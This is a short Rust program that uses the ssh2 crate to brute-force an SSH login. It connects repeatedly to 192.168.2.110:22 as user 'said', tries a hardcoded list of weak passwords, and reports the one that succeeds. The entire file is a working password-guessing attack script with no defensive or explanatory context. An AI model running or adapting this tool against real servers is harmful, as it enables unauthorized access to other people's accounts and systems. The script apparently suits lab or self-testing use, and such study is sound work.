use ssh2::Session;
use std::io::prelude::*;
use std::net::TcpStream;

fn main() {
    let target_ip = "192.168.2.110:22"; // SSH server IP and port
    let username = "said"; // Replace with your SSH username

    // List of potential passwords to try
    let passwords = vec!["password1", "password2", "password3", "password4","123456"];

    // Loop through each password and attempt to login
    for password in passwords {
        println!("Trying password: {}", password);

        let tcp = TcpStream::connect(target_ip).expect("Failed to connect to SSH server");

        let mut session = Session::new().expect("Failed to create SSH session");
        session.set_tcp_stream(tcp);
        session.handshake().expect("Failed to perform SSH handshake");

        let result = session.userauth_password(username, password);

        if result.is_ok() {
            println!("Password found: {}", password);
            break;
        } else {
            println!("Login failed with password: {}", password);
        }
    }
}
